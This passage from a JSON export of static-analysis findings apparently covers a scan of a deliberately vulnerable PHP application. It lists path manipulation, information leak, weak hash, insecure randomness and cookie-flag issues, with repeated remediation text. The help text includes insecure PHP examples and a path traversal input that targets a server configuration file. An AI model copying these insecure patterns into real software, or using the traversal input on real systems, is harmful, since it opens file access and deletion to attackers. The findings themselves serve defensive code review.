            "text" : "An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.\n\n\n\nExample 1: The following code writes an exception to the HTTP response:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from \"Standard error\" or \"Standard output\" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a \"syslog\" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.\n\nIn some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4404/?engineType=SCA&issue=1B2C407FF0993AA3C772BBB16DBE8298"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4634",
          "shortDescription" : {
            "text" : "System Information Leak: External"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in view_source.php with a call to highlight_string() on line 80. The information revealed by highlight_string() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.\n\n\n\nExample 1: The following code writes an exception to the HTTP response:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from \"Standard error\" or \"Standard output\" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a \"syslog\" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.\n\nIn some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4634/?engineType=SCA&issue=AE185927F276177C91B74758A9208209"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4692",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to file_get_contents() at view_source_all.php line 14, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4692/?engineType=SCA&issue=DAB21C419B1BE15EEAF08B1B37D71763"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4419",
          "shortDescription" : {
            "text" : "System Information Leak: External"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in view_source_all.php with a call to highlight_string() on line 16. The information revealed by highlight_string() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.\n\n\n\nExample 1: The following code writes an exception to the HTTP response:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from \"Standard error\" or \"Standard output\" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a \"syslog\" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.\n\nIn some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4419/?engineType=SCA&issue=22E3C1A355C9DA88B1C718178BE7D31C"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4592",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to file_get_contents() at view_source_all.php line 18, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4592/?engineType=SCA&issue=927A6C880DB9DEC17D15E8D28AD7EFE4"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4534",
          "shortDescription" : {
            "text" : "System Information Leak: External"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in view_source_all.php with a call to highlight_string() on line 20. The information revealed by highlight_string() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.\n\n\n\nExample 1: The following code writes an exception to the HTTP response:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from \"Standard error\" or \"Standard output\" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a \"syslog\" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.\n\nIn some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4534/?engineType=SCA&issue=6CF84D35DDE661B60F759455650D880C"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4417",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to file_get_contents() at view_source_all.php line 22, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4417/?engineType=SCA&issue=229E91B6C4BA2B3CF95D41FFF6926279"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4444",
          "shortDescription" : {
            "text" : "System Information Leak: External"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in view_source_all.php with a call to highlight_string() on line 24. The information revealed by highlight_string() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.\n\n\n\nExample 1: The following code writes an exception to the HTTP response:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from \"Standard error\" or \"Standard output\" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a \"syslog\" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.\n\nIn some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4444/?engineType=SCA&issue=3406729B3B3D3C4563F3A8E6DE6E5947"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4656",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to file_get_contents() at view_source_all.php line 26, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4656/?engineType=SCA&issue=C2835FA878504CA8E28D41591B77CAC4"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4636",
          "shortDescription" : {
            "text" : "System Information Leak: External"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in view_source_all.php with a call to highlight_string() on line 28. The information revealed by highlight_string() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.\n\n\n\nExample 1: The following code writes an exception to the HTTP response:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from \"Standard error\" or \"Standard output\" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a \"syslog\" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.\n\nIn some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4636/?engineType=SCA&issue=AFDA96459B2F26D6EBC76883720582E3"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4523",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4523/?engineType=SCA&issue=6534974404905CE22EE406A338E2E658"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4448",
          "shortDescription" : {
            "text" : "Cookie Security: HTTPOnly not Set"
          },
          "fullDescription" : {
            "text" : "The program creates a cookie in high.php on line 11, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.\n\n\n"
          },
          "help" : {
            "text" : "All major browsers support the HttpOnly cookie property that prevents client-side scripts from accessing the cookie. Cross-site scripting attacks often access cookies in an attempt to steal session identifiers or authentication tokens. Without HttpOnly enabled, attackers have easier access to user cookies.\n  \nIn this case, a cookie is set in high.php on line 11, but the HttpOnly parameter is not set or is set to false.\n  \n\nExample 1: The following code creates a cookie without setting the HttpOnly property.\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE);  //Missing 7th parameter to set HttpOnly\n\n\nEnable the HttpOnly property when you create cookies. You can do this by setting the HttpOnly parameter in the setcookie() call to true.\n\nExample 2: The following code creates the same cookie as the code in Example 1, but this time sets the HttpOnly parameter to true.\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE, TRUE);\n\n\nSeveral mechanisms to bypass setting HttpOnly to true have been developed, and therefore it is not completely effective.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4448/?engineType=SCA&issue=37C32D38D0523D814BDD546BEB197049"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4488",
          "shortDescription" : {
            "text" : "Cookie Security: Persistent Cookie"
          },
          "fullDescription" : {
            "text" : "Storing sensitive data in a persistent cookie can lead to a breach of confidentiality or account compromise.\n\n\n"
          },
          "help" : {
            "text" : "Most web programming environments default to creating non-persistent cookies. These cookies reside only in browser memory (they are not written to disk) and are lost when the browser is closed. Programmers can specify that cookies be persisted across browser sessions until some future date. Such cookies are written to disk and survive across browser sessions and computer restarts.\n\nIf private information is stored in persistent cookies, attackers have a larger time window in which to steal this data - especially since persistent cookies are often set to expire in the distant future. Persistent cookies are often used to profile users as they interact with a site. Depending on what is done with this tracking data, it is possible to use persistent cookies to violate users' privacy.\n\nIn this case, a cookie is set in high.php on line 11, but the Expire parameter is set to a non-zero number.\n\n\nExample: The following code sets a cookie to expire in 10 years.\n\nsetcookie(\"emailCookie\", $email, time()+60*60*24*365*10);\n\n\nDo not store sensitive data in persistent cookies. Be sure that any data associated with a persistent cookie stored on the server side is purged within a reasonable amount of time.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4488/?engineType=SCA&issue=572D1209115E7169FA45798AF4A61F05"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4711",
          "shortDescription" : {
            "text" : "Cookie Security: Cookie not Sent Over SSL"
          },
          "fullDescription" : {
            "text" : "The program creates a cookie without setting the <code>Secure</code> flag to <code>true</code>\n\n\n"
          },
          "help" : {
            "text" : "Modern web browsers support a Secure flag for each cookie. If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier.\n  \n\nExample 1: The following code adds a cookie to the response without setting the Secure flag.\n\n...\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\");\n...\n\n\nIf an application uses both HTTPS and HTTP, but does not set the Secure flag, cookies sent during an HTTPS request will also be sent during subsequent HTTP requests. Attackers may then compromise the cookie by sniffing the unencrypted network traffic, which is particularly easy over wireless networks.\n\nSet the Secure flag on all new cookies in order to instruct browsers not to send these cookies in the clear. This can be accomplished by passing true as the sixth argument to setcookie().\n\nExample 2: The following code corrects the mistake in Example 1 by setting the Secure flag to true.\n\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4711/?engineType=SCA&issue=E34A393410082A50C2C88326DC9A51E1"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4366",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4366/?engineType=SCA&issue=01B7E0420DF1CF1DF5971FDC2A5E6D85"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4504",
          "shortDescription" : {
            "text" : "Insecure Randomness"
          },
          "fullDescription" : {
            "text" : "The random number generator implemented by mt_rand() cannot withstand a cryptographic attack.\n\n\n"
          },
          "help" : {
            "text" : "Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in a security-sensitive context.\n\nIn this case, the function that generates weak random numbers is mt_rand() in impossible.php on line 6.\n\nComputers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated.\n\nThere are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and form an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between the generated random value and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing.\n\nExample: The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.\n\n\n  function genReceiptURL($baseURL) {\n    $randNum = rand();\n    $receiptURL = $baseURL . $randNum . \".html\";\n    return $receiptURL;\n  }\n\n\nThis code uses the rand() function to generate \"unique\" identifiers for the receipt pages it generates. Since rand() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.\n\nWhen unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Do not use values such as the current time because it offers only negligible entropy.)\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4504/?engineType=SCA&issue=5CFF39C4C372D3D8FF066C4AC2F61A94"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4485",
          "shortDescription" : {
            "text" : "Cookie Security: Persistent Cookie"
          },
          "fullDescription" : {
            "text" : "Storing sensitive data in a persistent cookie can lead to a breach of confidentiality or account compromise.\n\n\n"
          },
          "help" : {
            "text" : "Most web programming environments default to creating non-persistent cookies. These cookies reside only in browser memory (they are not written to disk) and are lost when the browser is closed. Programmers can specify that cookies be persisted across browser sessions until some future date. Such cookies are written to disk and survive across browser sessions and computer restarts.\n\nIf private information is stored in persistent cookies, attackers have a larger time window in which to steal this data - especially since persistent cookies are often set to expire in the distant future. Persistent cookies are often used to profile users as they interact with a site. Depending on what is done with this tracking data, it is possible to use persistent cookies to violate users' privacy.\n\nIn this case, a cookie is set in impossible.php on line 7, but the Expire parameter is set to a non-zero number.\n\n\nExample: The following code sets a cookie to expire in 10 years.\n\nsetcookie(\"emailCookie\", $email, time()+60*60*24*365*10);\n\n\nDo not store sensitive data in persistent cookies. Be sure that any data associated with a persistent cookie stored on the server side is purged within a reasonable amount of time.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4485/?engineType=SCA&issue=55F5C8DCB192D5AEC48EEF20EFAAE8F7"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4572",
          "shortDescription" : {
            "text" : "Cookie Security: HTTPOnly not Set"
          },
          "fullDescription" : {
            "text" : "The program creates a cookie in low.php on line 11, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.\n\n\n"
          },
          "help" : {
            "text" : "All major browsers support the HttpOnly cookie property that prevents client-side scripts from accessing the cookie. Cross-site scripting attacks often access cookies in an attempt to steal session identifiers or authentication tokens. Without HttpOnly enabled, attackers have easier access to user cookies.\n  \nIn this case, a cookie is set in low.php on line 11, but the HttpOnly parameter is not set or is set to false.\n  \n\nExample 1: The following code creates a cookie without setting the HttpOnly property.\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE);  //Missing 7th parameter to set HttpOnly\n\n\nEnable the HttpOnly property when you create cookies. You can do this by setting the HttpOnly parameter in the setcookie() call to true.\n\nExample 2: The following code creates the same cookie as the code in Example 1, but this time sets the HttpOnly parameter to true.\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE, TRUE);\n\n\nSeveral mechanisms to bypass setting HttpOnly to true have been developed, and therefore it is not completely effective.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4572/?engineType=SCA&issue=85759588A6D173FF6C15202166DAABFC"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4635",
          "shortDescription" : {
            "text" : "Cookie Security: Cookie not Sent Over SSL"
          },
          "fullDescription" : {
            "text" : "The program creates a cookie without setting the <code>Secure</code> flag to <code>true</code>\n\n\n"
          },
          "help" : {
